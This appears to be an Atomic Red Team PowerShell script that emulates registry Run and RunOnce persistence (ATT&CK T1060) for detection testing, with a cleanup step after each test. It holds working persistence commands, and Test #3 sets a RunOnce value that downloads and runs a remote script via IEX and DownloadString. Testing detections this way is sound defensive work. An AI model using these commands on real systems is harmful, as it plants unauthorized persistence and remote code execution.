write-output "T1060 - Registry Run Keys / Startup Folder"

write-output "Atomic Test #1 - Reg Key Run"
cmd.exe /c 'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Atomic Red Team" /t REG_SZ /f /d "C:\Path\AtomicRedTeam.exe"'

write-output "Clean Up Test #1"
cmd.exe /c "REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v \`"Atomic Red Team\`" /f >nul 2>&1"

write-output "Atomic Test #2 - Reg Key RunOnce"
cmd.exe /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d \`"C:\Path\AtomicRedTeam.dll\`""

write-output "Clean Up Test #2"
cmd.exe /c "REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1"

write-output "Atomic Test #3 - PowerShell Registry RunOnce"
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'

write-output "Clean Up Test #3"
Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore

